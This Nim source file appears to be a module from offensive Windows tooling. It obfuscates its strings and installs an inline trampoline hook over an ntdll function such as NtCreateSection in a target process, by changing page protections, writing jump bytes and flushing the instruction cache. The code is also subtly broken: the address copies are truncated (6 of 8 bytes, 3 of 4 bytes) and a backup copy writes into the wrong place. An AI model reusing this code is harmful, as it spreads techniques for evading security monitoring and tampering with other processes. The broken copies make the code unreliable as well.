

import winim/lean
import obfuscate
import RuyGetSyscallStub

type
    typeNtCreateSection* = proc (SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
                       MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
                       FileHandle: HANDLE): NTSTATUS {.stdcall.}


type
    MyNtFlushInstructionCache* = proc (ProcessHandle: HANDLE, BaseAddress: PVOID, NumberofBytestoFlush: ULONG): NTSTATUS {.stdcall.}


type
  HookedNtCreate* {.bycopy.} = object
    origNtCreate*: typeNtCreateSection
    ntCreateStub*: array[24, BYTE]

  HookTrampolineBuffers* {.bycopy.} = object
    originalBytes*: HANDLE    ##  (Input) Buffer containing bytes that should be restored while unhooking.
    originalBytesSize*: DWORD  ##  (Output) Buffer that will receive bytes present prior to trampoline installation/restoring.
    previousBytes*: HANDLE
    previousBytesSize*: DWORD

var ntdlldll = LoadLibraryA(obf("ntdll.dll"))
if (ntdlldll == 0):
    echo obf("[X] Failed to load ntdll.dll")


var NtFlushInstructionCacheAddress = GetProcAddress(ntdlldll,obf("NtFlushInstructionCache"))
if isNil(NtFlushInstructionCacheAddress):
    echo obf("[X] Failed to get the address of 'NtFlushInstructionCache'")


var NtFlushInstructionCache*: MyNtFlushInstructionCache
NtFlushInstructionCache = cast[MyNtFlushInstructionCache](NtFlushInstructionCacheAddress)


proc fastTrampoline*(targetProc: HANDLE, addressToHook: LPVOID, jumpAddress: LPVOID, buffers: ptr HookTrampolineBuffers = nil): bool

var g_hookedNtCreate*: HookedNtCreate

var ntCreate_Address*: HANDLE

var NtCreateSection*: typeNtCreateSection

proc fastTrampoline*(targetProc: HANDLE, addressToHook: LPVOID, jumpAddress: LPVOID, buffers: ptr HookTrampolineBuffers): bool =
    var trampoline: seq[byte]
    if defined(amd64):
        trampoline = @[
            byte(0x49), byte(0xBA), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov r10, addr
            byte(0x00),byte(0x00),byte(0x41), byte(0xFF),byte(0xE2)                                         # jmp r10
        ]
        var tempjumpaddr: uint64 = cast[uint64](jumpAddress)
        copyMem(&trampoline[2] , &tempjumpaddr, 6)
    elif defined(i386):
        trampoline = @[
            byte(0xB8), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov eax, addr
            byte(0x00),byte(0x00),byte(0xFF), byte(0xE0)                                      # jmp eax
        ]
        var tempjumpaddr: uint32 = cast[uint32](jumpAddress)
        copyMem(&trampoline[1] , &tempjumpaddr, 3)
    
    var dwSize: SIZE_T = cast[SIZE_T](len(trampoline))
    var dwordSize: DWORD = DWORD(len(trampoline))
    var dwOldProtect: DWORD = 0
    var output: bool = false
    var status: NTSTATUS = 0
    var szWritten: SIZE_T = 0
    


    if (buffers != nil):
        if ((buffers.previousBytes == 0) or buffers.previousBytesSize == 0):
            return false
        copyMem(unsafeAddr buffers.previousBytes, addressToHook, buffers.previousBytesSize)
    
    var protectAddress: LPVOID = addressToHook

    status = NtProtectVirtualMemory(targetProc,unsafeAddr protectAddress,addr dwSize,PAGE_READWRITE,addr dwOldProtect)

    if (status == STATUS_SUCCESS):
        echo obf("[+] NtProtectVirtualMemory RW permissions set for the hook")
        status = NtWriteVirtualMemory(targetProc,addressToHook,addr trampoline[0],dwordSize,addr szWritten)
        if (status == 0):
            echo obf("[+] NtWriteVirtualMemory - hook set.")
            output = true
        else:
            echo obf("[-] NtWriteVirtualMemory failed: "), toHex(status)
            output = false
    else:
        echo obf("[-] NtProtectVirtualMemory for the hook failed: "), toHex(status)
        output = false
    
    protectAddress = addressToHook
    status = NtProtectVirtualMemory(targetProc,unsafeAddr protectAddress,addr dwSize,PAGE_EXECUTE_READ,addr dwOldProtect)
    
    if(status != STATUS_SUCCESS):
        echo obf("[-] NtProtectVirtualMemory to restore page permissions failed")
    else:
        echo obf("[+] NtProtectVirtualMemory succeeded, page permissions (RX) restored")
    
    
    status = NtFlushInstructionCache(GetCurrentProcess(), addressToHook, dwordSize)
    if (status == 0):
        echo obf("[+] NtFlushInstructionCache success")
    else:
        echo obf("[-] NtFlushInstructionCache failed: "), toHex(status)
    
    return output